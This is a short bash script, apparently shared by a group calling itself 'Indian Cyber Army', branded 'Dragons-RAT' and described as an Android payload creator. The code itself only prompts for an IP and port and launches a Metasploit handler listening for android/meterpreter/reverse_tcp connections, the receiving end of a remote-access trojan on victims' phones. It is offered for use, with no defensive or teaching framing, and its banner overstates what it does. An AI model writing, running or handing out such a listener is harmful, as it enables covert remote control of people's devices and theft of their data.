#!/bin/bash

clear
cat<< EOF
      ____  ____      _    ____  ___  _   _ ____        ____      _  _____ 
     |  _ \|  _ \    / \  / ___|/ _ \| \ | / ___|      |  _ \    / \|_   _|
     | | | | |_) |  / _ \| |  _| | | |  \| \___ \ _____| |_) |  / _ \ | |  
     | |_| |  _ <  / ___ \ |_| | |_| | |\  |___) |_____|  _ <  / ___ \| |  
     |____/|_| \_\/_/   \_\____|\___/|_| \_|____/      |_| \_\/_/   \_\_|  
                                                                           
     ______________A SIMPLE PAYLOAD CREATOR USING METASPLOIT________________
       _________________________FOR ANDROID ONLY__________________________
       
         |-------------------------------------------------------------|      
         |                 MADE BY: INDIAN CYBER ARMY                  |
         |  YOUTUBE CHANNEL: https://www.youtube.com/@indiancyberarmy5 |
         +-------------------------------------------------------------+
________________________________________________________________________________          
EOF
read -p "Enter your IP Address ===>" ip
read -p "Enter listener port ===>" Port 
msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $ip; set lport $Port; exploit;"
